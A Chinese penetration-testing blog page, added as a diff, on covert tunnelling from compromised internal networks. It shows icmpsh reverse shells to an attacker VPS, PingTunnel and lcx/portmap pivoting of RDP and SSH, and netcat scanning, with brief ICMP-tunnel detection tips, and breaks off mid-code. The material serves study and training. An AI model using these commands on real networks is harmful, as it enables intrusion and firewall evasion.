@@ -1,0 +1,2476 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="内网第三章-隐藏隧道通信技术, 浮生">
+    <meta name="description" content="侠之大者，为国为民">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>内网第三章-隐藏隧道通信技术 | 浮生</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">浮生</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>Medias</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/musics">
+          
+          <i class="fas fa-music" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Musics</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/books">
+          
+          <i class="fas fa-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Books</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/galleries">
+          
+          <i class="fas fa-image" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Galleries</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">浮生</div>
+        <div class="logo-desc">
+            
+            侠之大者，为国为民
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			Medias
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/musics " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-music" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Musics</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/books " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-book" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Books</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/galleries " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-image" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Galleries</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/shuai06" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/shuai06" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">内网第三章-隐藏隧道通信技术</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    .toc-fixed .toc-link::before{
+        position: fixed!important;/*当toc的位置改为fixed时，.toc-link::before也要改为fixed*/
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/渗透测试/">
+                                <span class="chip bg-color">渗透测试</span>
+                            </a>
+                        
+                            <a href="/tags/内网/">
+                                <span class="chip bg-color">内网</span>
+                            </a>
+                        
+                            <a href="/tags/隧道技术/">
+                                <span class="chip bg-color">隧道技术</span>
+                            </a>
+                        
+                            <a href="/tags/端口转发/">
+                                <span class="chip bg-color">端口转发</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/渗透测试/" class="post-category">
+                                渗透测试
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-05-16
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    11.2k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    48 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="内网第三章-隐藏隧道通信技术"><a href="#内网第三章-隐藏隧道通信技术" class="headerlink" title="内网第三章-隐藏隧道通信技术"></a>内网第三章-隐藏隧道通信技术</h1><h2 id="内网连通性判断"><a href="#内网连通性判断" class="headerlink" title="内网连通性判断  "></a><font color="red">内网连通性判断  </font></h2><h4 id="常用判断方法"><a href="#常用判断方法" class="headerlink" title="常用判断方法"></a>常用判断方法</h4><p><strong>1.ICMP协议</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ping</span> <span class="token operator">&lt;</span>IP<span class="token operator">></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>2.TCP协议</p>
+<pre class="line-numbers language-bash"><code class="language-bash">nc -zv <span class="token operator">&lt;</span>IP<span class="token operator">></span> <span class="token operator">&lt;</span>port<span class="token operator">></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>3.HTTP协议</p>
+<pre class="line-numbers language-bash"><code class="language-bash">curl ip:port
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>4.DNS协议</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 1.</span>
+<span class="token function">nslookup</span> www.baidu.com vps-ip  <span class="token comment" spellcheck="true"># vps-ip是dns服务器的地址</span>
+
+<span class="token comment" spellcheck="true"># 2.</span>
+<span class="token function">dig</span> @vps-ip www.baidu.com
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="若流量不能直接流出"><a href="#若流量不能直接流出" class="headerlink" title="若流量不能直接流出"></a>若流量不能直接流出</h2><blockquote>
+<p>常见于企业办公网段上网的场景</p>
+</blockquote>
+<ol>
+<li>查看网络链接，判断是否存在与其他机器的8080(不绝对)等类似端口的连接(可以尝试运行<code>ping -n 1 -a &lt;ip&gt;</code>)</li>
+<li>查看内网中是否有主机名类似于<code>proxy</code>的机器</li>
+<li>查看IE浏览器的直接代理</li>
+<li>根据pac文件的路径(可能是本地路径，也可能是远程路径)，将其下载下来并查看。</li>
+<li>执行以下命令，利用curl工具进行确认</li>
+</ol>
+<pre class="line-numbers language-bash"><code class="language-bash">curl www.baidu.com    <span class="token comment" spellcheck="true"># 不通</span>
+curl -x proxy-ip:port  www.baidu.com    <span class="token comment" spellcheck="true"># 通</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title=" 网络层隧道技术"></a><font color="red"> 网络层隧道技术</font></h2><ul>
+<li>IPv6隧道</li>
+<li>ICMP隧道</li>
+</ul>
+<h4 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a>IPv6隧道</h4><p>常见工具：<code>socat</code>,<code>6tunnel</code>,<code>nt6tunnel</code>等</p>
+<p>概念：通过IPv6隧道传送IPv6数据报文(把IPv6报文整体封装在IPv4数据报文中，使得IPv6报文穿过IPv4海洋，到达另一个IPv6小岛)的技术</p>
+<p>现阶段的边界设备、防火墙甚至入侵防御系统还无法识别IPv6的通信数据，而大多数的操作系统支持IPv6，所有需要手动配置(win的网络属性中)<br>Note：即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包</p>
+<p><strong>配置隧道与自动隧道的区别：</strong><br>只有在执行隧道功能的节点的IPv6地址是兼容IPv4地址时，自动隧道才是可行的。在为执行隧道功能的节点分配ip地址时，如果采用的是自动隧道方法，就不需要进行设置。<br>配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如：DHCP/人工配置或其他IPv4的配置机制</p>
+<p><strong>防御：</strong><br>了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信</p>
+<h4 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h4><p>常见工具：<code>icmpsh</code>,<code>PingTunnel</code>,<code>icmptunnel</code>,<code>powershell icmp</code>等</p>
+<p>比较特殊的协议，<code>不用开放端口</code>，最常见的ICMP消息为ping命令的回复。<br>将TCP/UDP数据包封装到ICMP的ping数据包中，从而穿过防火墙。</p>
+<h6 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h6><p><strong>1.icmpsh</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 不需要管理员权限</span>
+<span class="token comment" spellcheck="true"># 简单，不存在正向反向</span>
+<span class="token comment" spellcheck="true"># 下载地址: https://github.com/inquisb/icmpsh</span>
+<span class="token comment" spellcheck="true"># 本机和目标都要安装</span>
+<span class="token comment" spellcheck="true"># 安装依赖库</span>
+<span class="token function">apt-get</span> <span class="token function">install</span> python-impacket
+
+
+<span class="token comment" spellcheck="true">### 使用</span>
+<span class="token comment" spellcheck="true"># 我机器执行</span>
+<span class="token comment" spellcheck="true"># 先关闭本地系统的icmp应答(恢复改为0就行) -> 否则会无限刷屏</span>
+sysctl -w net.ipv4.icmp_echo_ignore_all<span class="token operator">=</span>1
+
+./run.sh  <span class="token comment" spellcheck="true"># 输入目标的公网ip  （此文件好像不对，用下面的py文件吧）</span>
+<span class="token comment" spellcheck="true"># 或者</span>
+./icmpsh_m.py IP<span class="token punctuation">(</span>公网<span class="token punctuation">)</span> IP<span class="token punctuation">(</span>内网的公网ip<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 这个的公网ip获取方法：ping外面，在外面抓包获取数据包的源地址 / 访问外面的地址然后查看网站访问日志等</span>
+
+<span class="token comment" spellcheck="true"># 目标机器执行（这里使用的win版本）</span>
+icmp.exe -t 192.168.1.7 -d 500 -b 30 -s 128  <span class="token comment" spellcheck="true"># 192.168.1.7我的vps</span>
+
+<span class="token comment" spellcheck="true"># 我的vps就会接收到反弹过来的shell</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>2.PingTunnel</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 下载地址：http://freshmeat.sourceforge.net/projects/ptunnel/</span>
+<span class="token comment" spellcheck="true"># 貌似可以这么安装：sudo apt install ptunnel</span>
+<span class="token comment" spellcheck="true"># 可跨平台使用。为了避免滥用，可为隧道设置密码</span>
+
+<span class="token comment" spellcheck="true"># 情景：得到的内网主机无法3389连接到数据库服务器，但是可以ping通。我们需以此机器为跳板访问另体贴数据库服务器</span>
+
+<span class="token comment" spellcheck="true"># 首先在两台机器都安装上此工具</span>
+<span class="token comment" spellcheck="true">## 安装方法</span>
+<span class="token comment" spellcheck="true">#1.安装编译</span>
+<span class="token function">tar</span> -zxvf <span class="token punctuation">..</span>.
+<span class="token function">cd</span> <span class="token punctuation">..</span>.
+<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span>
+<span class="token comment" spellcheck="true">#2.如果缺少pcap.h(数据包捕获函数库),就安装</span>
+<span class="token function">wget</span> http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz
+<span class="token function">tar</span> -zxvf <span class="token punctuation">..</span>.
+<span class="token function">cd</span> <span class="token punctuation">..</span>.
+./configure
+<span class="token comment" spellcheck="true">#3.如果yacc包错误，安装</span>
+<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> -y byacc
+<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> flex bison
+<span class="token comment" spellcheck="true">#好了之后再安装一遍</span>
+./configure
+<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span>
+<span class="token comment" spellcheck="true"># 查看帮助信息</span>
+<span class="token function">man</span> pcap
+
+
+<span class="token comment" spellcheck="true">## 使用方法</span>
+<span class="token comment" spellcheck="true">#4.运行PingTunnel(现在是linux上使用，也可在win上使用，只不过需要在内网的win服务器安装wincap类库)</span>
+<span class="token comment" spellcheck="true"># 跳板机器(假设是已获取到的web服务器)：</span>
+ptunnel -x shuteer111
+<span class="token comment" spellcheck="true"># VPS上：</span>
+ptunnel -p <span class="token operator">&lt;</span>跳板_IP<span class="token operator">></span> -lp 1080 -da <span class="token operator">&lt;</span>另一新目标_IP<span class="token operator">></span> -dp 3389 -x shuteer111
+<span class="token comment" spellcheck="true"># 含义：在访问本地的1080端口时，会把数据库服务器(新目标)的3389数据封装在icmp隧道中，以web服务器为'ICMP隧道跳板'进行传送(窗口会显示是本地的ip，但是实际是另一台数据库服务器的)</span>
+
+<span class="token comment" spellcheck="true">#5.在攻击机器访问本地的1080端口，成功访问到另一台数据库服务器的3389端口</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>参数说明：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">-x    <span class="token comment" spellcheck="true"># 指定icmp隧道连接验证密码</span>
+-p    <span class="token comment" spellcheck="true"># 指定icmp隧道另一端机器(跳板)的ip地址</span>
+-lp   <span class="token comment" spellcheck="true"># 指定要监听的本地tcp端口</span>
+
+-da   <span class="token comment" spellcheck="true"># 指定要转发的机器的ip地址</span>
+-dp   <span class="token comment" spellcheck="true"># 指定要转发的机器的tcp端口</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>其他工具</strong></p>
+<h6 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h6><p>通过Wireshark进行ICMP数据包分析，如下：</p>
+<ul>
+<li>检查同一来源的ICMP数据包的数量。一个正常的ping命令每秒最多发送两个数据包，而使用ICMP隧道的浏览器会在很短的时间内产生上千个ICMP数据包</li>
+<li>注意那些Payload大于64bit的ICMP数据包</li>
+<li>寻找响应数据包的Payload与请求数据包中的Payload不一致的ICMP数据包</li>
+<li>检查ICMP数据包的协议标签。例如：icmptunnel会在所有的ICMP Payload前面添加”TUNL”标记来标识隧道 -&gt; 这就是特征</li>
+</ul>
+<h2 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title=" 传输层隧道技术"></a><font color="red"> 传输层隧道技术</font></h2><p>传输层技术包括：TCP隧道、UDP隧道、常规端口转发等</p>
+<p>若内网防火墙阻止了指定端口的访问，在获得目标主机权限后，可以使用iptables打开指定端口</p>
+<h4 id="1-lcx端口转发"><a href="#1-lcx端口转发" class="headerlink" title="1.lcx端口转发"></a>1.lcx端口转发</h4><p>两个版本：</p>
+<ul>
+<li>Linux 版本：<code>portmap</code></li>
+<li>Widows版本：<code>lcx.exe</code></li>
+</ul>
+<p>一个客户端一个服务端</p>
+<p><strong>lcx内网端口转发</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash">先传lcx到目标机器
+<span class="token comment" spellcheck="true">#在内网目标shell上: l</span>
+cx -slave 公网ip 4444 127.0.0.1 3389  <span class="token comment" spellcheck="true"># 把目标机器的3389流量转发到指定服务器(vps)指定端口</span>
+<span class="token comment" spellcheck="true">#vps服务器(我的)上执行：</span>
+lcx -listen 4444 33891  <span class="token comment" spellcheck="true"># 将本地4444端口上监听的所有数据转发到本机33891端口</span>
+
+<span class="token comment" spellcheck="true">#然后远程桌面连接本地的33891端口即可</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>lcx本地端口映射</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 如果目标防火墙 限制了部分端口的数据(如3389)，可以进行端口转发：把3389端口的数据转发到防火墙允许的其他端口(如:53)</span>
+<span class="token comment" spellcheck="true"># 在目标主机执行</span>
+lcx -tran 53 <span class="token operator">&lt;</span>目标ip<span class="token operator">></span>: 3389
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><strong>linux版的portmap</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 下载地址：http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip</span>
+
+<span class="token comment" spellcheck="true"># vps</span>
+./portmap -m 2 -p1 6666 -h2 公网ip -p2 7777
+<span class="token comment" spellcheck="true"># 目标内网机器</span>
+./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网ip -p2 6666
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="2-netcat"><a href="#2-netcat" class="headerlink" title="2.netcat"></a>2.netcat</h4><p>安装</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">## Linux</span>
+<span class="token comment" spellcheck="true"># http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download</span>
+<span class="token comment" spellcheck="true">#1. </span>
+<span class="token function">apt-get</span> <span class="token function">install</span> netcat
+
+<span class="token comment" spellcheck="true"># 2. </span>
+<span class="token function">wget</span> <span class="token punctuation">..</span>.
+<span class="token function">tar</span> -zxvf <span class="token punctuation">..</span>.
+<span class="token function">cd</span> <span class="token punctuation">..</span>.
+./configure
+<span class="token function">make</span>
+
+<span class="token comment" spellcheck="true">## Windows</span>
+https://joncraton.org/files/nc111nt.zip
+https://joncraton.org/files/nc111nt_safe.zip
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>参数</p>
+<pre class="line-numbers language-bash"><code class="language-bash">
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>使用</strong><br>Banner抓取</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># banner可标识服务的版本等信息</span>
+
+<span class="token comment" spellcheck="true"># 题外话:追踪路由</span>
+<span class="token function">mtr</span> 114.114.114.114 
+
+
+<span class="token comment" spellcheck="true">## nc作为客户端：</span>
+<span class="token comment" spellcheck="true"># 参数 -v  显示详细信息 </span>
+<span class="token comment" spellcheck="true"># 参数  -n  如果是域名,不进行域名解析(建议直接跟ip地址)</span>
+nc -nv 1.1.1.1 110   <span class="token comment" spellcheck="true"># 连接pop3服务器，可以看到banner信息（可以进行user登录[base64编码],输入指令）</span>
+nc -nv 1.1.1.1 25    <span class="token comment" spellcheck="true"># smtp服务器</span>
+nc -nv 1.1.1.1 80    <span class="token comment" spellcheck="true"># 探测80端口(都可进行交互的命令)</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>连接到远程主机</p>
+<pre class="line-numbers language-bash"><code class="language-bash">nc -nvv 1.1.1.1 110 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>端口扫描</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#并非擅长端口扫描, 还慢</span>
+<span class="token comment" spellcheck="true">#参数 -z 扫描参数，只判断是否开放（默认tcp）</span>
+nc -nvz 1.1.1.1  20-8080
+<span class="token comment" spellcheck="true">#参数 -u  扫描udp服务的端口 （不太准确）</span>
+nc -nvzu 1.1.1.1 1-1024
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>端口监听</p>
+<pre class="line-numbers language-bash"><code class="language-bash">nc -l -p 999
